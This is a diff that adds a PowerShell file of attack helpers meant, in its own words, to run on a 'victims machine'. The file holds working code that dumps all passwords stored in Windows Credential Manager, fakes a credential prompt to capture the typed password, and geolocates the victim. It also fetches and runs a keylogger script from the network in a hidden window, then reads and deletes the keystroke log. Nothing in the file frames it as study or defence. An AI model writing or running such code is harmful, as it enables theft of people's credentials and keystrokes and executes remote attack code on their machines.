@@ -1,0 +1,22 @@
+#Functions for you to run on the victims machine ("applets" if you will	)
+    
+    #Gets password stored in Credential Manager (Useful for IE)
+   function Show-Passwords { [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
+		$vault = New-Object Windows.Security.Credentials.PasswordVault
+		$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
+	}
+    #Creates a popup with custom message. Once users types in their credentials it displays in plain text on screen
+    function Prompt-Password {
+[CmdletBinding()]
+param (
+[string]$Message
+)
+
+$Password = Get-Credential -UserName $ENV:USERNAME -Message $Message 
+$Password.GetNetworkCredential() | fl *
+             }
+    #Get Geolocation of victim
+    Function Get-Geolocation { $ip = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip; Invoke-RestMethod -Method Get -Uri "http://freegeoip.net/xml/$ip" | Select-Object -Property InnerXML |fl *} 
+    function Download-Keylogger {PowerShell.exe -NoLogo -NoProfile -WindowStyle Hidden -Command {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')}}
+    Function Show-Keylogs { Get-Content "$env:TEMP\key.log" }
+    Function Delete-Keylogs { Remove-Item "$env:temp\key.log"}
